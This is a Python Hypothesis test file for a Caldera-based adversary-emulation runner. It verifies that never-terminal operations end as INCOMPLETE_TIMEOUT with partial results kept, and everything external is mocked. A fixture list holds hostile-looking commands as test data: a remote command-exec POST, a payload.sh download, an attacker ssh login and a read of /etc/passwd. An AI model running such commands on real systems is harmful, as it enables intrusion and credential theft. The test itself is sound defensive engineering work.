"""Property-based test for Property 3 of the stage6-execution-redesign design
(task 3.8) — core of the collection bug fix.

# Feature: stage6-execution-redesign, Property 3: Timeout sem terminal produz
# INCOMPLETE_TIMEOUT e preserva parciais

Validates: Requirements 3.2

This is a ``feature`` property test (stage6-execution-redesign is a feature
spec): the property is expected to HOLD on the current
:class:`~app.services.operation.runner.OperationRunner` implementation. It
exercises the timeout branch of the incremental collection loop
(:meth:`OperationRunner._collect_until_terminal`): when the Caldera Operation's
snapshots **never** reach a terminal state before the collection timeout
(measured from ``started_at`` via the injected clock), the Operation must end in
``INCOMPLETE_TIMEOUT`` with the partial per-Ability results preserved and NOT be
counted as a successful run.

The invariant, stated operationally over the runner's public ``run`` API
--------------------------------------------------------------------------
For any Operation whose snapshots stay non-terminal (``state`` always
``"running"``), serving a chain of ``N`` non-terminal links (each ``pendente``
or ``em_execucao``), with an injected clock that advances past a finite
``collection_timeout``:

* the final persisted :data:`OperationState` is ``INCOMPLETE_TIMEOUT`` and the
  run :data:`RunOutcome` is ``INCOMPLETE_TIMEOUT``;
* every partial :class:`AbilityResult` collected is **preserved** — the number
  of persisted rows equals the maximum number of links observed across polls
  (``N``), none discarded;
* the run is **not** a successful execution: ``total_success == 0`` (no link
  ever reached ``sucesso``) and the aggregate reflects only what was collected.

Everything external is mocked (no real Caldera, no real Docker daemon, no real
clock/sleep):
- Caldera is a :class:`httpx.MockTransport`-backed real :class:`CalderaClient`
  whose ``GET /api/v2/operations/{id}`` always returns a non-terminal
  (``running``) snapshot with the generated non-terminal links.
- Isolation is a fake verifier that reports every target container isolated, so
  the isolation gate (and the periodic re-check) never interfere with the
  timeout branch under test.
- The clock is an injected monotonic counter that advances a fixed step per
  call; the sleeper is a no-op. Together they drive the loop deterministically
  to the timeout without touching the real clock.
- The database is an **ephemeral temp-file SQLite** built fresh *per example*
  and torn down in a ``finally`` block, so row counts are exact and no ``.db``
  state leaks between examples.

_Requirements: 3.2_
"""

from __future__ import annotations

import json
import os
import tempfile
from dataclasses import dataclass, field
from pathlib import Path

import httpx
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st
from sqlalchemy import func, select
from sqlalchemy.orm import Session, sessionmaker

from app.core.config import Settings
from app.db.base import Base, import_models
from app.db.session import create_db_engine
from app.models.domain import AbilityResult, Operation
from app.models.enums import AbilityResultStatus, OperationState
from app.services.audit.audit_logger import AuditLogger
from app.services.caldera import (
    ABILITIES_PATH,
    HEALTH_PATH,
    OPERATIONS_PATH,
    CalderaClient,
)
from app.services.containment.isolation import ContainerIsolationVerdict, IsolationResult
from app.services.operation.runner import OperationRunner, RunOutcome

_CALDERA_OP_ID = "op-timeout"


# ---------------------------------------------------------------------------
# Duck-typed Ability the runner / containment / preview all accept.
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class FakeAbility:
    """A minimal Ability exposing the attributes the runner consumes.

    Kept a plain object (no DB row) so the run path never depends on
    Case/Ability rows existing. The executor commands are internal-only so the
    destination-containment gate always passes, isolating Property 3's variable
    (the never-terminal snapshots) from the pre-flight gates.
    """

    ability_id: str
    name: str
    executors: tuple[dict[str, str], ...]


# Internal-only concrete commands (all destinations ⊆ internal subnets) so the
# containment gate always PASSES.
_INTERNAL_COMMAND_TEMPLATES: tuple[str, ...] = (
    "curl -X POST -F 'cmd=whoami' http://192.168.20.30:5055/exec",
    "wget http://192.168.20.30/payload.sh",
    "ssh attacker@192.168.30.40 'id'",
    "cat /etc/passwd",
    "uname -a",
)


def _ability_strategy() -> st.SearchStrategy[FakeAbility]:
    """Generate an Ability with 1..2 internal-only executor commands."""
    return st.builds(
        lambda uid, cmds: FakeAbility(
            ability_id=f"ability-{uid.hex[:8]}",
            name=f"T{1000 + (uid.int % 600)} - generated",
            executors=tuple(
                {"name": "sh", "platform": "linux", "command": cmd} for cmd in cmds
            ),
        ),
        st.uuids(),
        st.lists(st.sampled_from(_INTERNAL_COMMAND_TEMPLATES), min_size=1, max_size=2),
    )


# Non-terminal Caldera link status codes only: ``None`` -> pendente, ``-3`` ->
# em_execucao. Crucially excludes ``0`` (sucesso) and any other finished status
# (falha), so no link is ever terminal and no run ever counts as success.
_NON_TERMINAL_STATUS_CODES: tuple[int | None, ...] = (None, -3)


# ---------------------------------------------------------------------------
# Mocked Caldera — serves only non-terminal snapshots.
# ---------------------------------------------------------------------------


@dataclass
class NeverTerminalCaldera:
    """A MockTransport handler that always serves a non-terminal snapshot.

    ``GET /api/v2/operations/{id}`` returns ``state="running"`` (never a terminal
    state in :data:`TERMINAL_OPERATION_STATES`) with a fixed chain of
    non-terminal links. Because the state never becomes terminal, the runner's
    collection loop can only exit via the collection timeout — the branch under
    test (Req. 3.2).

    Attributes:
        chain: The non-terminal link payloads returned on every poll.
    """

    chain: list[dict] = field(default_factory=list)
    requests: list[httpx.Request] = field(default_factory=list)

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        method = request.method.upper()
        path = request.url.path

        if method == "GET" and path == HEALTH_PATH:
            return httpx.Response(200, json={"status": "ok"})
        if method == "POST" and path == ABILITIES_PATH:
            return httpx.Response(200, json=json.loads(request.content.decode("utf-8")))
        if method == "POST" and path == OPERATIONS_PATH:
            return httpx.Response(
                200,
                json={"id": _CALDERA_OP_ID, "name": "run", "state": "running"},
            )
        if method == "GET" and path == f"{OPERATIONS_PATH}/{_CALDERA_OP_ID}":
            # Always non-terminal: state "running", same non-terminal chain.
            return httpx.Response(
                200,
                json={
                    "id": _CALDERA_OP_ID,
                    "state": "running",
                    "chain": self.chain,
                },
            )
        raise AssertionError(f"unexpected request: {method} {path}")


def _build_chain(status_codes: list[int | None]) -> list[dict]:
    """Build a Caldera ``chain`` of non-terminal links from status codes.

    Each link gets a distinct ``ability_id`` so reconciliation keys them
    individually (one persisted ``AbilityResult`` per link).
    """
    chain: list[dict] = []
    for index, status in enumerate(status_codes):
        link: dict = {
            "id": f"link-{index}",
            "ability": {"ability_id": f"ability-{index}"},
            "command": "",
        }
        # Omit "status" entirely for the pendente (None) sentinel so the payload
        # mirrors a link Caldera has not run yet; otherwise send the -3 sentinel.
        if status is not None:
            link["status"] = status
        chain.append(link)
    return chain


def _isolated_verifier(containers: list[str], _inspector: object) -> IsolationResult:
    """A fake isolation verifier: every requested container is isolated.

    Mirrors :func:`inspect_isolation`'s signature so it drops straight into the
    runner. Reporting all containers isolated keeps the pre-flight isolation gate
    AND the periodic in-loop re-check open, isolating Property 3's variable (the
    never-terminal snapshots) from the isolation branches.
    """
    verdicts = tuple(
        ContainerIsolationVerdict(container=name, isolated=True, reasons=())
        for name in containers
    )
    return IsolationResult(passed=True, verdicts=verdicts)


# ---------------------------------------------------------------------------
# Injected clock / sleeper — deterministic timeout, no real sleep.
# ---------------------------------------------------------------------------


@dataclass
class SteppingClock:
    """A monotonic clock that advances a fixed step on each call.

    Starts at ``0.0`` and returns ``n * step`` on the n-th call. With a step
    large enough relative to the (finite) collection timeout, the deadline check
    ``self._clock() >= deadline`` in the loop is guaranteed to fire after a
    bounded number of polls, so the loop always exits via timeout — never hanging
    and never requiring a terminal state.
    """

    step: float
    _calls: int = 0

    def __call__(self) -> float:
        value = self._calls * self.step
        self._calls += 1
        return value


def _noop_sleep(_seconds: float) -> None:
    """A no-op sleeper so the loop never touches the real clock."""
    return None


# ---------------------------------------------------------------------------
# Ephemeral per-example SQLite (exact counts, no state leak).
# ---------------------------------------------------------------------------


def _build_ephemeral_session() -> tuple[Session, Path, object]:
    """Create a fresh temp-file SQLite engine + schema and return a session."""
    tmp_dir = tempfile.mkdtemp(prefix="stage6_timeout_")
    db_path = Path(tmp_dir) / "runner.db"
    settings_obj = Settings(database_url=f"sqlite:///{db_path.as_posix()}")

    engine = create_db_engine(settings_obj)
    import_models()
    Base.metadata.create_all(bind=engine)

    session_factory: sessionmaker[Session] = sessionmaker(
        bind=engine,
        autocommit=False,
        autoflush=False,
        expire_on_commit=False,
        future=True,
        class_=Session,
    )
    return session_factory(), db_path, engine


def _count(session: Session, model: type) -> int:
    """Count all rows of ``model`` in the (per-example) database."""
    return session.execute(select(func.count()).select_from(model)).scalar_one()


# ---------------------------------------------------------------------------
# Property 3 — timeout without terminal => INCOMPLETE_TIMEOUT, partials kept.
# ---------------------------------------------------------------------------


@settings(
    max_examples=120,
    deadline=None,
    suppress_health_check=[HealthCheck.too_slow],
)
@given(
    abilities=st.lists(_ability_strategy(), min_size=1, max_size=4),
    link_statuses=st.lists(
        st.sampled_from(_NON_TERMINAL_STATUS_CODES), min_size=1, max_size=6
    ),
    collection_timeout=st.floats(min_value=1.0, max_value=120.0),
    campaign_id=st.sampled_from(["apt41_dust", "c0010", "shadowray", None]),
)
def test_property3_timeout_without_terminal_marks_incomplete_and_preserves_partials(
    abilities: list[FakeAbility],
    link_statuses: list[int | None],
    collection_timeout: float,
    campaign_id: str | None,
) -> None:
    """Property 3: timeout sem terminal => INCOMPLETE_TIMEOUT, parciais preservadas.

    # Feature: stage6-execution-redesign, Property 3: Timeout sem terminal
    # produz INCOMPLETE_TIMEOUT e preserva parciais
    Validates: Requirements 3.2

    For any execution whose snapshots never reach a terminal state before the
    collection timeout elapses (injected clock advances past it), the Operation
    ends in ``INCOMPLETE_TIMEOUT`` / :data:`RunOutcome.INCOMPLETE_TIMEOUT`, every
    partial :class:`AbilityResult` collected is preserved (the persisted count
    equals the number of observed non-terminal links), and the run is not counted
    as a success (``total_success == 0``).
    """
    session, db_path, engine = _build_ephemeral_session()
    chain = _build_chain(link_statuses)
    handler = NeverTerminalCaldera(chain=chain)
    caldera = CalderaClient(transport=httpx.MockTransport(handler))
    try:
        # A clock whose step is large relative to the timeout guarantees the
        # loop crosses the deadline after a bounded number of polls, so it always
        # exits via timeout (never a terminal state, never hanging). The step is
        # the full timeout so at most a couple of polls occur before the deadline
        # is observed as crossed.
        clock = SteppingClock(step=collection_timeout)
        runner = OperationRunner(
            session=session,
            caldera=caldera,
            audit_logger=AuditLogger(session),
            isolation_verifier=_isolated_verifier,
            collection_interval=2.0,
            collection_timeout=collection_timeout,
            # Keep the periodic isolation re-check from firing before the timeout:
            # with the fake verifier it would pass anyway, but setting the recheck
            # interval to the full timeout keeps the branch under test clean.
            isolation_recheck_interval=30.0,
            clock=clock,
            sleeper=_noop_sleep,
        )

        result = runner.run(
            campaign_id=campaign_id,
            abilities=abilities,
            adversary_id="adv-timeout",
            confirmed=True,
            target_containers=["nginx", "db"],
        )

        # Outcome + final state are the timeout branch (Req. 3.2).
        assert result.outcome is RunOutcome.INCOMPLETE_TIMEOUT
        assert result.state is OperationState.INCOMPLETE_TIMEOUT

        # The Operation did start executing (it was created and polled), but it
        # is NOT a successful run: no link ever reached ``sucesso``.
        assert result.started is True
        assert result.total_success == 0
        assert result.total_failure == 0

        # The persisted Operation row carries the same terminal-timeout state and
        # aggregate — nothing is marked FINISHED/successful.
        assert _count(session, Operation) == 1
        operation = session.execute(select(Operation)).scalar_one()
        assert operation.state is OperationState.INCOMPLETE_TIMEOUT
        assert operation.total_success == 0
        assert operation.total_failure == 0

        # Partials preserved: exactly one AbilityResult per observed link, none
        # discarded. The max observed link count is the length of the chain
        # (served identically on every poll).
        expected_partials = len(chain)
        assert _count(session, AbilityResult) == expected_partials
        assert len(result.ability_results) == expected_partials

        # Every preserved partial is non-terminal (pendente / em_execucao) — the
        # bug fix must not fabricate terminal results on timeout.
        persisted_statuses = {
            row.status
            for row in session.execute(select(AbilityResult)).scalars().all()
        }
        assert persisted_statuses <= {
            AbilityResultStatus.PENDING,
            AbilityResultStatus.RUNNING,
        }

        # The loop actually polled Caldera (so the timeout branch was reached via
        # real observation, not a short-circuit).
        assert any(
            r.method.upper() == "GET"
            and r.url.path == f"{OPERATIONS_PATH}/{_CALDERA_OP_ID}"
            for r in handler.requests
        )
    finally:
        caldera.close()
        session.close()
        engine.dispose()
        if db_path.exists():
            os.remove(db_path)
        os.rmdir(db_path.parent)
